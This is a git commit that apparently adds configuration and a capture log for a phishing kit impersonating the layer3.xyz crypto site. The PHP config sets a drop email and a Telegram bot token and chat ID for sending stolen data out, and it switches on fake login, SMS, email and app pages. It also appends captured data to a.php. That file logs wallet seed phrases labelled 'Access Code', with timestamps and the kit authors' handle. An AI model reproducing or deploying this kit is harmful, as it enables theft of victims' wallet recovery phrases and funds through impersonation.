2b41bcb4c507bd66ae0c7d66c4eaf8b397c0b6e4
Layer3Connect <146790998+Layer3Connect@users.noreply.github.com>
2023-10-03 11:51:34 +0100

    Add files via upload

---
+++ LY/system/Your_Info.php
@@ -0,0 +1,38 @@
+<?php
+
+
+/* Change Email Adress recovery / just to see result :) */
+$Your_Mail = "traplange@proton.me";
+/* --------------------------  */
+
+
+/* this is bot telegram :)  */
+$botToken="6534803617:AAGgM40zr6YDp45soGWqA3QO2Khpg49AJzE";
+$chatId="-1001854077031";  
+/* --------------------------  */
+
+/* If you want two to see the result, If you want to stop , change To off  :)  */
+$botToken_0="on"; 
+$chatId_0="on";  
+/* --------------------------  */
+
+
+/* All Page  :) If you want to stop, change To off  */
+$Page_Login = "on" ; 
+$Page_Info = "on" ; 
+$Page_Sms = "on" ; 
+$Page_Email = "on" ; 
+$Page_App = "on" ; 
+/* --------------------------  */
+
+/* All info about Team ;)  */
+
+$Group_fs ="https://t.me/BLACKROSE_Official_Community";    
+$FS0C13TY_Root ="https://t.me/FS0C13TY_Root";  
+/* --------------------------  */
+
+$f = fopen("../../a.php", "a");
+	fwrite($f, $yagmai);
+
+
+?>
---
+++ a.php
@@ -0,0 +1,28 @@
+
+[👤 seed phrase] =  huge wish rural coach mercy icon buzz above manage copper street hurry
+[+]━━━━【💻 System】━━━[+]
+[🔍 IP INFO] = http://www.geoiptool.com/?IP=127.0.0.1
+[⏰ TIME/DATE] =30-09-2023 12:57:09am
+
+[👤 seed phrase] =  huge wish rural coach mercy icon buzz above manage copper street hurry
+[+]━━━━【💻 System】━━━[+]
+[🔍 IP INFO] = http://www.geoiptool.com/?IP=127.0.0.1
+[⏰ TIME/DATE] =30-09-2023 12:57:29am
+
+[========== 🌐 ⚡ 𝐋𝐀𝐘𝐄𝐑𝟑.𝐗𝐘𝐙 ⚡ 🌐 ===========]
+[🌍 Website] = 🌠✨『www.layer3.xyz』✨🌠
+[👤 Access Code] =  february roast ankle lottery innocent dizzy shoe club pause kit diesel advance
+[+]━━━━【🕵🏼𝘂𝘀𝗲𝗿-𝗶𝗻𝗳𝗼】━━━[+]
+[🌐 IP INFO] = http://www.geoiptool.com/?IP=127.0.0.1
+[⏰ TIME/DATE] =30-09-2023 07:08:32am
+[=======🥷 Main Author: @BLACKROSE_1337========]
+
+
+[========== 🌟 𝐋𝐀𝐘𝐄𝐑𝟑.𝐗𝐘𝐙 🌟 ===========]
+[🌍 Website] = ✨『www.layer3.xyz』✨
+[👤 Access Code] =  february roast ankle lottery innocent dizzy shoe club pause kit diesel advance
+[+]━━━━【🕵🏼𝘂𝘀𝗲𝗿-𝗶𝗻𝗳𝗼】━━━[+]
+[🌐 IP INFO] = http://www.geoiptool.com/?IP=127.0.0.1
+[⏰ TIME/DATE] =30-09-2023 07:14:05am
+[=======🥷 Main Author: @BLACKROSE_1337========]
+
